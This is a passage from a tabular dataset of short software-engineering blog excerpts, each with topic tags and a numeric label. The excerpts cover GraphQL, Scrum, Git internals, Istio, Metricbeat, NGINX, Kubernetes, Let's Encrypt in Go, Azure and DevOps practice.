what data may be retrieved. For example, here is a query from our team model: This says that a client can retrieve a user given a service (e.g. Git Hub) and an identity (e.g. However, the user is just the beginning. Here are the descriptions of the user and org types in our schema: An exclamation point (!) means that the item may not be null. The user definition says that a user consists of three string values, one boolean, and three lists containing instances of associated types (similar for an organization). A Graph QL schema contains type descriptions like this plus definitions for the queries and updates (called Mutations) supported by the server. Our queries and mutations are: To me, this looks a lot like some sort of RPC definition. The special sauce that makes Graph QL powerful, however, is the clients ability to select which data she wants returned. Lets go back to that first query: Here is a use of it that requests the value of the terms field: This is passed to a Graph QL server via an HTTP POST. All operations for the API go through the same HTTP end point. In curl, this would look like: The returned payload is: Notice that we received the value for the terms field. What if we ask for more? Now we get: So we can specify the fields we want for our types and even the fields for referenced objects recursively. Here we said we wanted the name and max Writers field for each org owned by plissken. As one final example, lets ask for the admins for each owned org: We get: Clearly, this is very powerful. Once you establish a schema, a Graph QL client can select the information required for a particular task as needed. Also, if we decide later that we need more data for a particular type, we can add it and all existing calls will remain unaffected.","['GraphQL', 'Database', 'Postgresql', 'Go', 'Docker']",10
2471,"Mutations are very much like RPC calls except that they allow specification of the data to be returned, just like queries. If we set out to update our user, we can use our update User By Identity mutation: This says that we can update a user by specifying her service and identity values and an instance of User Update Input for the new data. The update returns a User Change Response which has fields for the user and any errors that were generated. Just like in a query, the returned user data can be expanded by specifying fields of interest. Here's an example: This call returns: We picked up substantial benefits right away for this kind of highly connected model just by switching to a relational database. Supporting navigation from multiple directions and sets of users for organizations with different properties (e.g. admins, writers) would require redundancies in a document model and would make it impossible to perform updates transactionally. Additionally, the integrity constraints provided by an RDBMS remove an entire class of errors we would otherwise need to handle. One simple example is if a client tries to add a user to an organization but presents an invalid user id. This is caught for us by a constraint that the user field in the table connecting orgs and users reference an entry in the users table. None of this is probably news to anyone reading this, but I feel like some of the benefits of an RDBMS are often forgotten today with the popularity of No SQL databases. In any case, we were able to easily map our Graph QL schema onto a relational model. Well see where Postgre SQL really shines when we talk about optimizations in Part 2.","['GraphQL', 'Database', 'Postgresql', 'Go', 'Docker']",8
2472,"We got around these issues through judicious use of Docker. Here at Yipee.io, we model our own application using our modeler and run it using Docker. This means that our UI developers could simply use docker-compose to bring up or shut down our entire set of services (including the database). They could bring up one set of services to do unrelated development and switch to the new database version in about 30 seconds. Also, as we added features or fixed bugs, we could push a new version of our team functionality as a Docker image and they could incorporate it with little to no effort. They, in turn, could generate a new UI image to hand off to our UX team for review. Such short cycle times radically change the time and resources required to react to user feedback and new requirements.","['GraphQL', 'Database', 'Postgresql', 'Go', 'Docker']",10
2473,"Having well defined stories or tasks going into a sprint is a big step to getting a team closer to completing their sprint commitment. But there still might be another piece to the puzzle, depending on on how the team itself is working in the sprint Its easy to end up with too many tasks in progress during a sprint: some individuals work faster than others, some items may get blocked waiting on an external dependency, someone says they need more work, and so on. The problem with this is that the team have lost focus on getting things done link- and by that Im referring to the Definition of Done. Its no use having lots of things nearly done at the end of a sprint as you cant release that into production and your customer receives no benefit. A team might think that theyll fix it next sprint, but in reality all that happens is that the same problems compound, and the overall situation gets even worse. It can get so bad that you end up with your testers carrying an entire sprints worth of debt (testing that they havent completed yet)so what are the developers going to work on during that sprint? A common problem here is that the team are working as individuals, not as a team. Its quite likely that the developers are working on an item and then throwing it over the fence to test. That might seem fine but it means that the testers (through no fault of their own) are always going to be the long tail. If theyre given work 12 days just before the end of a sprint they have little chance of completing it all on time. In reality the team is just running mini-waterfall.","['Agile', 'Scrum Problems', 'Incomplete Sprints', 'Work In Progress']",1
2474,"Depending on the exact work involved a Squad is made up of one developer and one automation tester (because all your testing is automated, right?). When the Squad picks up a new item to work on they have a conversation called a 3 amigos where they get together with the Product Owner (or BA) in order to go over the work and ensure that everyone has a common understanding. Why do this, when the item has already been refined and agreed? Refinement may have happened several weeks before, and the team members may have just finished another piece of work, so getting everyone together for a refresher can be very useful. Worst case you waste 510 minutes because everyone is on the same page, but you may find a small difference that saves you 23 (or more) days of development / test effort that then needs to be re-worked, so I feel that this more than justifies a quick 510 minute chat. Once this chat has happened and everyone is agreed then the developers and testers start work on the item at the same time. This massively reduces the opportunity that the developers will finish well ahead of the testers. The testers can use the same feature branch that the developers are working on, so they dont need to lag behind waiting for a skeleton API / UI element definitions to be ready. The developers may not initially be working like this but in my experience its a small change for them and the benefits to the testers is huge because they can really get into the guts of the work much sooner, all of which helps the team with the initial goal of getting work completed, to the Definition of Done within a sprint. If the developers do finish much earlier than the testers (you can drill into the details of that in a retrospective) then they can try to help the testers finish their workautomation tests are code after all, and developers can write code so they can help. That can take a bit of a mindset shift and its not always practical to just throw more people at a problem, but even just getting them to sit together to pair program on the tests often saves time, as the developer can explain some of the more subtle complexities of the work, and another set of eyes on something is always useful.","['Agile', 'Scrum Problems', 'Incomplete Sprints', 'Work In Progress']",0
2475,"Git also utilizes this Directed Acyclic Graph structure for content storage. Git is essentially a content-addressable filesystem made up of objects that form a hierarchy which mirrors the contents filesystem tree. Git has three main primitive types it uses to represent content for a repository: trees, blobs, and commits. All content is essentially stored as either tree or blob objects. A blob is a file stored in the repository and a tree object references either subtrees or blobs. You can think of the blob as the file contents while the trees are like directories. A commit object, on the other hand, has three main attributes. It points to a tree which represents a top-level snapshot of the project at the time of the commit. It also contains references to the commits that came directly before it, a field for author of the commit and, optionally, a commit message.","['Git', 'Version Control', 'Github', 'Linux', 'Software Development']",18
2476,"Git was written with a toolkit design philosophy on par with the command line tools used and built within the Linux community. While the toolkit design afforded users more granular, low-level access to much of the functionality of Git, it has a steep learning curve for new users due to the large suite of commands that may be non-intuitive to many people unfamiliar with command line tools or other VCSs. Git also lacks in its ability to be linked and built onto other services and applications. Many application developers who have built or are building tools on top of Git complain about a lack of a linkable library. The Git binary is not reentrant, meaning it cannot be interrupted in the middle of its execution and then be called again safely. This forces any applications or web services using the binary to execute a call to the binary and wait for it to fully execute before calling it again, negatively affecting application speed. There are a couple projects working on remedying this lack of a linkable library, most notably libgit2, a cross platform linkable library implementation of Git.","['Git', 'Version Control', 'Github', 'Linux', 'Software Development']",18
2477,"If you are working on a new website you will see that PWAs for desktop is a nice addition to your site. Users who want to run it as a desktop app can do it. This has some obvious benefits, nicely summarized on Pete Le Pages Desktop Progressive Web Apps article: If you have been working on a project that was a desktop app, the question can be the opposite: What benefit does a desktop app gives you vs the website? We have seen this battle over and over again on the mobile landscape, with apps vs mobile web. The main advantage of an app is its discoverability, through the Play Store / App Store, but more than that is the presence on your home screen. When you install the app on your phone its there on your grid of apps. You will see the icon easily and you will open it with just a tap. You might get notifications if you opt-in, which will be a good way for the app owner to let you re-engage with you. Doing this on the web is possible, but more difficult. Knowing that a web site can be installed is not that obvious.","['Web Development', 'Pwa', 'Progressive Web App']",19
2478,"Currently, we use Netflixs Hystrix as our circuit breaking technology. Hystrix wraps all calls to external systems, resources, or dependencies in a Hystrix Command or Hystrix Observable Command object which typically executes within a separate thread. If the call takes longer than established thresholds, a timeout will occur based on the 99.5th percentile performance of all the requests for a given resource. Hystrix will maintain a pre-configured thread for each dependency. If the thread pool becomes full, requests directed to that resource will be immediately rejected instead of queued up, preventing the overloading of downstream services. Hystrix Circuit Breaking continuously measures successes, failures, timeouts, and thread rejections so it knows when to close the circuit. Once the circuit is closed requests are automatically reestablished.","['Microservices', 'Mobile App Development', 'Mobile Architecture', 'Microservice Architecture', 'DevOps']",3
2479,"Services can use multiple distributed resources in order to display the response to a user request. The Bulkhead Pattern compartmentalizes these calls so that poor performance of one service does not negatively impact the results of other services, and in the end, the user experience. The Bulkhead Pattern is based on a familiar concept implemented in ship designs. Ships are divided into watertight compartments in order to keep water from spreading from one compartment to other areas in the ship during a hull breach. Each of these compartments is called a bulkhead. This way if the ships hull is compromised the risk of the ship sinking is reduced.","['Microservices', 'Mobile App Development', 'Mobile Architecture', 'Microservice Architecture', 'DevOps']",11
2480,"DAG Run: This is the run-time version of a specific DAG, thus it is provided with additional context (such as when it was triggered, for which date/time period), and has a state (is it currently running? )Operator: A Python class defining how to perform a specific operation, which can then be used in a dag. Airflow comes with a set of standard operators (to run a SQL query, execute a bash operation, a Python function, a HDFS transfer operation, perform a check, run a docker container, run a Spark Job), but you can also define your own implementations Task: This is a step in the DAG, a configured usage of a specific Operator, that you configure to define which upstream task precedes it, thus organizing the DAGs workflow logic, dependencies and processing order Task Instance: This is a contextualized run-time execution of a specific task, just like a DAG Run is the contextualized run-time version of a DAG. Task Instances will be pushed by the scheduler to the worker and trigger the execution of a specific job Well now build a very basic yet typical wait for data/process data workflow handling a simple raw click-stream events aggregation scenario.","['Docker', 'Data Science', 'Apache Airflow', 'Workflow']",7
2481,"There are many parameters that can tune the behavior of the scheduler (which tasks should be run first? ), but paraphrasing the documentation is beyond the scope of this article. Just know that all of these can be tuned either in the parameters of each DAG object, or globally in the __url__ file.","['Docker', 'Data Science', 'Apache Airflow', 'Workflow']",3
2482,"After the two IBM Cloud Private cluster installations are complete, you can move on to the next step.1. Download the Istio 1.1 release package from the Istio release site corresponding to your operating system (OS). For example, if your OS is Linux, run the following command:2. Run the following commands to extract the Istio package. Enter the release directory and add the istioctl binary to your PATH environment variable:3. Prepare the root CA certificates for Citadel for all of your clusters. The shared root CA is used by cross cluster m TLS communication.","['Istio', 'Multicluster', 'Icp']",7
2483,"Note: The following instructions use the certificates from the Istio samples directory for both clusters. In your production environment, you should use the CA certificate signed by your organizations root CA.4. Generate the Istio deployment manifest YAML file with multicluster gateways by using Helm, run the following command:5. Create a Kubernetes secretthat contains your generated CA certificates. Run the following commands in each cluster:6. Run the following command to apply the Istio installation manifest YAML file that was generated in the previous step to install Istio in each cluster:7. Verify that the Istio service and pods are ready by running the following command: As you verify the Istio service and pods from the output, you may notice that a extra service called istiocoredns, is deployed. istiocoredns is used to handle DNS resolution for remote services.8. Verify that the multicluster gateways are ready by running the following command: You have deployed two identical Istio control plane in the IBM Cloud Private clusters and are ready to move to the next step.","['Istio', 'Multicluster', 'Icp']",7
2484,"For an IBM Cloud Private cluster, you need to update the existing Kubernetes DNS config Map named kube-dns for each cluster that will be calling services in your remote clusters. Run the following command to configure the Kubernetes DNS:1. Deploy the bookinfo application in cluster1 and then delete the reviews deployment of versions v2 and v3. Deploy the ratings service and version v2 and v3 of the reviews services in cluster2. Create the bookinfo gateway in cluster1 and then access the bookinfo application through the gateway by running the following commands: Point your browser to http://$GATEWAY_URL/productpage to view the Bookinfo web page. If you refresh the page several times, you might see the productpage with reviews and details services, but without the ratings service because only v1 of the reviews service is running on cluster1 and it does not call the ratings services. Continue to follow the steps to learn how to add reviews services of version v1 and v2 to the entire mesh.4. Get the host IP and the Node Port of Istio ingress gateway in cluster2. Create Service Entry and Destination Rule for the reviews service in cluster2.","['Istio', 'Multicluster', 'Icp']",11
2485,"Create Service Entry and Destination Rule configurations. Run the following command: Note: The labels of the subsets in the destination rule map to the Service Entry endpoint label, (cluster: cluster2) correspond to the cluster2 gateway. Once the request reaches the destination cluster, the local Destination Rule configuration can be used to identify the actual pod labels (version: v2 or version: v3).6. Run the following command to define the subset v1 with Destination Rule in cluster1:7. Define the subsets of v2 and v3 with Destination Rule in cluster2 by running the following command:8. Create a Virtual Service configuration on cluster1 that route the reviews service traffic for the user jason to the reviews versions v2 and v3 (50/50) and traffic for any other user to the reviews version v1:9. Verify that the route rules across the entire mesh are working as expected: Return to the /productpage of the Bookinfo application and log in as a user and refresh the browser. You should see the display alternating between black and red ratings stars (v2 and v3). If you log out the user jason or log in as another user, the reviews service appears without ratings service (v1).","['Istio', 'Multicluster', 'Icp']",11
2486,"In the previous article, we discussed how to use Metricbeat to ship metrics from Kubernetes. Now, its time to share our experience of using Metricbeat to monitor bare Docker containers and shipping container data to Elasticsearch and Kibana. This knowledge may be useful for developers and administrators who manage Docker containers without orchestration. Examples in this tutorial were tested in the following environment: Ubuntu 16.04 (Xenial Xerus)Metricbeat 6.3.2 download from the apt repository Docker 18.03.1-ce We assume that you already have a working Docker environment on your system and a few containers running. If not, see the official Docker installation guide and learn how to run Docker containers as daemons. Youll need to have at least one container running in Docker to ship some useful data to Elasticsearch and Kibana.","['Docker', 'Kubernetes', 'Monitoring', 'Kibana']",7
2487,"To install Metricbeat, you first need to add Elastics signing key used to verify the downloaded package: Next, add the Elastic repository to your repository source list: Finally, update the repos on your system and install Metricbeat using apt-get: To run Metricbeat, you should configure input (metrics sources like Docker), output (a remote service or database to send these metrics to), and various modules if needed. This configuration is located in the __url__ inside the Metricbeat folder. Take a look at what edits we have made: There are several configuration options to pay attention to: __url__ -- we load module configurations from external files to keep things isolated. All module configuration files are located under the /modules.d/ folder so to target them we used *.yml glob pattern. We have also enabled config reloading. Metricbeat will periodically monitor our configuration files, and, if any changes are detected, it will reload the entire configuration.setup.template.setting -- specifies the index template for Metricbeat. Our Metricbeat index will have 1 shard and will be compressed using best_compression type based on high compression ratio.setup.dashboards.enabled -- we will be loading Kibana example dashboards for Metricbeat. These dashboards include visualization and searches examples for our metrics.setup.kibana -- for the dashboards to work, we need to specify the Kibana endpoint. You'll need to enter the URL of your Kibana host and any credentials (username/password) if needed.output.elasticsearch -- specifies the output to which we send Metricbeat metrics. We are using Elasticsearch, so you will need to provide Elasticsearch host, protocol, and credentials if needed.","['Docker', 'Kubernetes', 'Monitoring', 'Kibana']",7
2488,"First, we need to manually enable the Docker module because we load external configuration files into our general configuration. The default Docker module configuration sits in the modules.d directory. We can enable or disable any module configuration under modules.d by running modules enable or modules disable commands. For example, to enable the docker config in the modules.d directory, you can run: Now, as the module is enabled, lets tweak its configuration. This is how it looks like in the __url__ file: This is a minimal configuration suffice to get Metricbeat going. We have specified 8 metricsets including image metricset not included by default. Also, your Docker module needs access to the Docker daemon. By default, Docker listens on the Unix socket ""unix:///var/run/docker.sock"". We can use this socket to communicate with the daemon from within a container. Through this endpoint, Docker exposes the Docker API which can be used to get a stream of all events and statistics generated by Docker.","['Docker', 'Kubernetes', 'Monitoring', 'Kibana']",7
2489,"Todays internet user experience demands performance and uptime. To achieve this, multiple copies of the same system are run, and the load is distributed over them. As the load increases, another copy of the system can be brought online. This architecture technique is called horizontal scaling. Software-based infrastructure is increasing in popularity because of its flexibility, opening up a vast world of possibilities. Whether the use case is as small as a set of two for high availability or as large as thousands around the globe, theres a need for a load-balancing solution that is as dynamic as the infrastructure. NGINX fills this need in a number of ways, such as HTTP, TCP, and UDP load balancing, which we cover in this post.","['Nginx', 'Web Development', 'Technology', 'DevOps']",11
2490,"When balancing load, its important that the impact to the client is only a positive one. Many modern web architectures employ stateless application tiers, storing state in shared memory or databases. However, this is not the reality for all. Session state is immensely valuable and vast in interactive applications. This state might be stored locally to the application server for a number of reasons; for example, in applications for which the data being worked is so large that network overhead is too expensive in performance. When state is stored locally to an application server, it is extremely important to the user experience that the subsequent requests continue to be delivered to the same server. Another facet of the situation is that servers should not be released until the session has finished. Working with stateful applications at scale requires an intelligent load balancer. NGINX Plus offers multiple ways to solve this problem by tracking cookies or routing.","['Nginx', 'Web Development', 'Technology', 'DevOps']",10
2491,"If the service youre load balancing over requires multiple packets to be sent back and forth between client and server, you can specify the reuseport parameter. Examples of these types of services are Open VPN, Voice over Internet Protocol (Vo IP), virtual desktop solutions, and Datagram Transport Layer Security (DTLS). The following is an example of using NGINX to handle Open VPN connections and proxy them to the Open VPN service running locally: You might ask, Why do I need a load balancer when I can have multiple hosts in a DNS A or SRV record? The answer is that not only are there alternative balancing algorithms with which we can balance, but we can load balance over the DNS servers themselves. UDP services make up a lot of the services that we depend on in networked systems, such as DNS, NTP, and Vo IP. UDP load balancing might be less common to some but just as useful in the world of scale.","['Nginx', 'Web Development', 'Technology', 'DevOps']",11
2492,"I dont like waiting in lines, lines of any kind. Hatred of lines is one of my many character flaws. It is this hatred for waiting in lines that drove me to look to find a faster way to run my code through a build pipeline in Azure Dev Ops. I have been doing quite a bit of work with Kubernetes of late and thought it would be an ideal location. A build server on Kubernetes would allow me to control the build host configuration and a near zero queue time waiting for my builds to fail and show me where I messed up. This article walks through setting up an Azure Dev Ops agent on Azure Kubernetes Service (AKS).","['Docker', 'Kubernetes', 'Azure Devops', 'Azure Kubernetes Service', 'Azure']",10
2493,"As a first post, I want to make a point of why and how I am going to use my IT blog. Mainly, all contents are based on University class where I study Computer Engineering for the second major. As a college of Liberal Arts student, starting Engineering needs courage as well as lots of studying to catch up. This blog is specifically for people who want to gain basic knowledge of computer engineering step by step and also a good tool for me to study hard. )before data structure C++ is one of Object Oriented programming languages and OOPs have characteristics of Encapsulation, Inheritance, Polymorphism, Abstraction. Encapsulation is about capturing data and keeping it safely and securely from outside interfaces. This can be accomplished by allowing variables changed only by functions inside the class. Binding data and method(operation) into one single unit(a class) and using Access Modifier(ex. public, private, protected) are two important aspects of encapsulation. Understanding STL already built in C++ and using it well is important.","['Education', 'Cplusplus', 'Computer Engineering']",2
2494,"In C++ keyword new, delete is used for dynamic allocation and always use pointer to allocate dynamically. Dont forget to delete after dynamically allocating __url__ in C++ is 1. Currently running object and 2. pointer. In the example above, circle c1, c2, c3 changes from 1, 2, 3 to 4, 5, 6.","['Education', 'Cplusplus', 'Computer Engineering']",3
2495,"My responsibility was to release a rugged mobile computer in the enterprise marketplace. Due to the aggressive time schedule, we conducted limited market research. My team and I decided that Near Field Communication (NFC) was a nice to have feature rather than a must have. As a result, we were forced to make that decision within the first month or two of the development process12 months ahead of release. As the market continued to shift and change through the development process, we were getting more requests for NFC. You might be thinking, if it was so important, why didnt you just add NFC to the product? Doesnt your agile process allow for changes like this? You would think, but since hardware involves physical products that have defined shapes and sizes, its not so easy to make changes once specs are locked in. To implement NFC mid-development, it would require an additional antenna, a redesign of the electrical board to make room for the new antenna, additional testing, and potentially additional resources. Not only is this costly, but it impacts the product release schedule. Hardware product managers now need to be ready to answer these questions: Sales: We need NFC to close this deal. I told them we can support it. Project Manager: What is the incremental cost and the schedule impact? Engineer: What else can we give up to make room for NFC? VP Product: How much are our customers willing to pay for this additional feature? C-Suite: What is the business case? We ultimately decided to not implement NFC because of the incremental development cost and the lack of justification that it would increase our average selling price. Our customers wanted NFC but they were not willing to pay more for it. Looking back, it may have been the wrong decision but imagine how things would have turned out if we said yes to NFC from the beginning. The electrical board would be designed for multiple antennas, the incremental cost would have been significantly cheaper and it would have been part of the original value proposition. Being forced to make product feature decisions a year or so in advance is extremely challenging, stressful and unforgiving.","['Product Management', 'Technology', 'Decision Making', 'Software Development', 'Hardware']",1
2496,"The time to market for a software-only product is light years faster than its fellow hardware sibling. This is mainly due to the infamous concept of Minimal Viable Product (MVP). How to define MVP is a discussion for another day, but the concept makes it completely acceptable for software PMs to release functional yet extremely simple first product. We can continue to improve our product on the fly which eliminates the need to be perfect on day one. Since software is not confined by physical constraints, consumers expect their software solution to change, adapt and morph. Sure, hardware can change too, but it requires a completely new product redesign with a new product launch.","['Product Management', 'Technology', 'Decision Making', 'Software Development', 'Hardware']",16
2497,"To manage the expectation of constant change, whenever I am asked to make a product decision (which feels like all the time), I ask myself one question: Is this decision permanent or can it be changed in the future? Most of the time, the answer is that it can be changed in the future. This makes every product decision much less scary. This does not mean that I can make decisions without proper research because if I make a series of bad yet changeable decisions, I am going to incur some serious technical debt. My decisions should still be backed by data, however, it is totally OK not to know everything. This is why the decision making process is so different: The software decision making process is short term because we dont need to know the market needs a few year from now. We just need to solve the customers pain points today.","['Product Management', 'Technology', 'Decision Making', 'Software Development', 'Hardware']",12
2498,"But therein lies the problem: How can you get a whole team to start speaking the same estimate language? The SCRUM framework provides little help in that it advises not to attach any real-world valuessuch as timeto the numbers used to represent an estimate. One common strategy is to use numbers from the Fibonacci sequence as story points that each represent abstract complexity. The combined total of story points from the whole team in each sprint represents the total complexity that can be accomplished within the sprints time frame. This, of course, is velocity, a measurement of team throughput that is key for analyzing team performance and capabilities. Another common strategy simplifies this even further by using T-shirt sizessmall, medium, large, __url__ order to measure complexity.","['Agile', 'Software Development', 'Engineering Mangement', 'Quality Assurance']",1
2499,"The goal is to accurately measure velocitya number that represents a teams relative capabilities within a fixed team period, such as a two-week sprint. Sprint after sprint this can be analyzed in order to spot problems, such as a sprint in which too little work was successfully accomplished. And over time it can be used to measure improvements, i.e. how much more work can be accomplished or how much more efficiently can the same amount of work be completed and delivered to customers. But in order to make this cumulative measurement accurate, the components from which it is derived must also be accurate. And in order to do that, a task must only encapsulate work that can be executed from start to finish by a single team member. This task can then be estimated by that team member who can take into account all of the known and unknown complexity as well as his or her own capabilities and limitations.","['Agile', 'Software Development', 'Engineering Mangement', 'Quality Assurance']",1
2500,"But lets jump straight into an example. Sometimes its better to drive a car before learning how each component of it works Lets create a simple N __url__ applicationa simple HTTP server that returns a string with the OS hostname and platform: We can fire it up by typing node __url__ into our terminal. Verify that it is up n running by opening localhost:3000 in your local web browser. Once youve done that, go on! Alright, weve got our N __url__ application. Lets put it into a Docker containerthe defacto standard for containerizing applications. Create a file called DOCKERFILE in the same directory as you N __url__ application: What this does is it basically just grabs the node LTS (long-term supported) version from the Docker Hub, adding our previously created __url__ to the container. After thats done, the command node __url__ will be executed (like we did earlier).","['Docker', 'Kubernetes', 'Container', 'DevOps', 'Serverless']",7
2501,"Alright, lets go all in and use GCP: Google Cloud Platform. Its quite easy once you get started. Just sign up for it; youll get some sweet $$$ to test things out! Once youve also installed the cloud SDK, add the kubectl tool:gcloud components install kubectl This installs kubectl, a command line tool (CLI) to manage kubernetes. It can take a while to install, so you can grab a cup of coffee in the meantime. After that, try to create a new project:gcloud projects create simple-http-projectset-as-default and create a new kubernetes cluster called simple-http-kubes with 2 nodes:gcloud container clusters create simple-http-kubes --num-nodes 2 --machine-type f1-micro --region us-east1Youll probably receive an error asking you to enable the Kubernetes Engine API. Just follow the link and activate it;) After thats done, reissue the command. After that, youll receive a response like that: And now youre up and running! Open the MASTER_IP shown above in your browser and you will see nothing. Well, weve never told our little kube cluster which container it should be executing. To deploy the application to your cluster, run the following command in your terminal:kubectl run simple-http-kubes --image=<<your_docker_username>>/simple-http --port=3000 --generator=run/v1Thats it. But we also have to expose the cluster by using a load balancer:kubectl expose rc simple-http-kubes --type=Load Balancer --name simple-http Wait until your Load Balance has got an external IP (you can check that with kubectl get services) and load it (and the port ofc ).","['Docker', 'Kubernetes', 'Container', 'DevOps', 'Serverless']",7
2502,"The business logic or you can say the controller logic behind the application is nothing but the methods that will work on a specific route. There are five functions in total. I am requiring our Book model, previously created, as it provides functions for us to query CRUD operations to the database. A mongoose query can be executed in two ways, by providing a callback function or by using.then() function which also indicates that mongoose support promises. I am using the promising approach above to avoid the nuisance caused by nested callbacks (and commonly known as callback hell).","['Nodejs', 'JavaScript', 'React', 'Web Development', 'Tutorial']",15
2503,"External factors: Were both parts on time? How was the internet connection quality for that phone round? Even if you account for that, how do you know how much was the impact? Psychological factors: The interviewee was nervous! Maybe they rarely get a shot because they went to a Community College and their resume looks weird? One hour is not enough time to assess peoples technical ability, let alone what psychological factors were into play.","['Interview', 'Software', 'Coding Interviews', 'Referrals', 'Startup Lessons']",0
2504,"How much of a penalty did the interviewee get because they didnt come from the same background? Or are from a different gender? Or uses a programming language that the interviewer hates? Even if one is fully aware of their biases, and nobody ever is, that doesnt eliminate its effects.","['Interview', 'Software', 'Coding Interviews', 'Referrals', 'Startup Lessons']",0
2505,"Therefore, I was determined to take a rather different approach. Once I realized this, I started looking for other approaches to take. That is when I came across the concept of Aspect Oriented Programming (AOP). Personally, Im not a fan of quoting wikipedia, but this is the definition it gave me,Once I saw this definition, I thought to myself, Yess!! So, I dug deep to find out more about it. As the definition suggests, AOP allows the separation of cross cutting concerns which includes logging across the application as well.","['Java', 'Wso2', 'Aspectj', 'Aop', 'Wso2 Api Manager']",9
2506,"There are several paths we could choose while implementing this idea. Lets overview and compare them: Regular polling (client makes request every X seconds to the server, asking Is there a match? And now, is there a match now? Benefits of using Polling: Would work on almost anything Drawbacks of using Polling: Exhausts the network Not real-time data If our client (subscriber) is a website, we could use the web push notifications API introduced quite recently. This would definitely be an overkill for simple event-based communication with the server, but it is possible. Using that technology, our client would be able to subscribe to certain types of notifications, and our publishes (server) would be able to send them.","['JavaScript', 'Architecture', 'Multithreaded', 'Communication', 'Faye']",6
2507,"If we think about that, whenever a client makes a request to the server, a thread or a forked process are handling that request, right? So, we have a thread T1 handling our request (holding the clients connection alive until any news come in)Now, lets think about our publisher. Assume we have some background worker on a separate server running advanced computations to find a match for our user. The computation completed and a match has been found. Now, the background worker needs to inform our main API that a match was found, who, in turn, needs to update the end-client. But what if we have several instances of the client-facing API? Our load balancer forwarded the clients request to instance 1, which has Thread1 that is holding the clients request, but our background-worker was sent to instance 2 on a completely separate machine. Considering this, how will our client be informed?? By default, Faye publishes events to the current machines memory. Meaning, an event that was published on instance-2 will be private to that instance and available only on its memory. Instance 1 will have absolutely no idea about that event.","['JavaScript', 'Architecture', 'Multithreaded', 'Communication', 'Faye']",11
2508,"Vendors that try to steer you towards letting them handle the integration and interface build instead of building it yourself. If you can negotiate an agreement that sees your vendor handle some of the work for you, great. But be wary of services that dont seem to have a straightforward standardized integration process. If the system requires expert knowledge and custom development for the initial integration, where will that leave you when you need to make changes or launch new search applications? Support costs that are not factored into a predictable monthly fee. The GSA wasnt cheap and moving to a Saa S solution should allow you to save some money. Make sure it doesnt come back to bite you later! In summary, to choose the best GSA replacement in the short time you have left, you should focus your decision making on these three factors: Ease of integration. You shouldnt require expensive development, and it should be quick to implement.","['Cloud Computing', 'Search', 'Search Engines', 'Information Technology', 'Digital Marketing']",10
2509,"Ive been building a lot of webhooks lately, and more often than not, I need serve my applications over HTTPS. A common way of quickly achieving this is by utilising Lets Encrypt, however it can be a bit fiddly to setup. Id really like to be able to automate the process entirely, including certificate renewal. Ive been building my applications using docker, and Id like to keep the build process and container images as lightweight as possible. Lastly, Id like to have the entire process as application code, so I can easily change and re-deploy things on the fly. Also, having no ops/shell scripts allows my applications to be portable and easily deployed to many different environments.","['Golang', 'Docker', 'Web Development', 'Go', 'Containers']",7
2510,"Accept TOS specifies that you accept the Lets Encrypt Terms of Service. The Cache field specifies if, and how, the autocert package should cache certificates. Lets Encrypt has rate limits which limit how often you can request a certificate, so its important to store certificates somewhere you can retrieve them later. Here we are specifying that the certificates should be stored in the cert-cache directory. Lastly, the Host Policy allows us to whitelist which domains we wish to request certificates for. Without this setting its possible for attackers to exhaust your rate limit allocation and possibly stop you from generating the certificates you need, so it is important.","['Golang', 'Docker', 'Web Development', 'Go', 'Containers']",11
2511,"Ive been a Linux developer for the past 15 years. I work for Adobe as part of the Adobe Experience Cloud. We have used Linux and open source software (OSS) almost exclusively to build our Saa S offerings. Hearing that we would use a cloud run by the maker of Windows gave me reason to pause. Could our Linux ethos work on Azure? Would I have to install a Windows VM just to do my job? Two years later, heres a brief compilation of some advice I would give a Linux developer who is considering using Microsoft Azure.","['Azure', 'Linux', 'Open Source', 'Kubernetes', 'Cloud Computing']",16
2512,"Partially-managed services might not sound that great, but we have found them to be extremely helpful in rapid prototyping. Using HDInsight, you can have any of these and can focus on building your software. Once your prototype graduates, you can decide to stick with HDInsight or transition to a self-managed stack. Weve taken both approaches at Adobe. In one case we used HDInsight Kafka for rapid development and kept it into production with great results. In other cases, our operations team took ownership and we deprovisioned HDInsight.","['Azure', 'Linux', 'Open Source', 'Kubernetes', 'Cloud Computing']",19
2513,"Azure isnt perfect, but it definitely isnt horrible either. It is more than this Linux developer thought it would be, and Ive been able to stay true to my open source workflow while using it. It very well may be the preferred cloud of Linux developers in the future. Microsoft being the biggest OSS contributor in the world also sounds kind of crazy. If Microsoft can learn to love Linux, anything is possible.","['Azure', 'Linux', 'Open Source', 'Kubernetes', 'Cloud Computing']",16
2514,"Dev Ops focused on the component libraries that the product used for its first code migration project. Inadvertently, they created a production workflow that crippled the development workflows. An example of a typical development workflow is fixing a bug in a library component of the product. The developer checks out a library repro, make code changes, and test before checking it in. The code that used to take 15 seconds to build would now take around 5 minutes. The build script changed to have Jenkins build, run a bunch of tests, package the library, and upload the package onto a server. The developer needed to redirect the product to download and use this new version. A developer may compile code many times especially when theyre debugging a problem with the code.","['DevOps', 'Technical Debt', 'Software Development', 'Continuous Integration']",18
2515,"The next thing done was to move the build machines and test machines off of physical machines and into AWS AMI. A limiting issue found was AWS doesnt support Mac and consumer Windows versions. Half of the problem was solved using Windows Server and Linux images, but Mac and Windows 10 was still needed. There are a few rent a Mac cloud services available, but they charged quite a lot more money per hour than AWS does. The cost made it a prohibitive solution because the test bed was quite large. In the end, the solution decided upon is to build a farm of machines that hosted a pool of VMs for the missing Mac and Windows. Each of the physical machines could host one to four VMs depending on its hardware spec. Jenkins would spin up a node with the VM when it needed.","['DevOps', 'Technical Debt', 'Software Development', 'Continuous Integration']",10
2516,"After all the building blocks were assembled, it was time to revisit the developer workflow issue. The solution was to split the script into two logic paths, which used the git command line to decide. If the git branch isnt develop or master, it followed logic to build on the local machine. Else, it would use logic to build through Jenkins. Also, the main repository would have the component repositories as submodules. It reconnected the main repository with the component codes so it didnt have to download the built packages and can use the locally built one.","['DevOps', 'Technical Debt', 'Software Development', 'Continuous Integration']",18
2517,"You minimize your IDE and switch to the Web browser, heading over to the monitoring dashboard. Theres one red dot, which you click. Its the black box check for the API, which just timed out. You open up a new tab and go to the login page for your application, but it doesnt load.","['DevOps', 'Startup', 'Software Development', 'SaaS', 'Software Engineering']",7
2518,You switch back to the monitoring dashboard. Three black box checks have failed. Two of the databases are reported as offline. The Elasticsearch cluster has also become unhealthy with half of your index shards unassigned.,"['DevOps', 'Startup', 'Software Development', 'SaaS', 'Software Engineering']",8
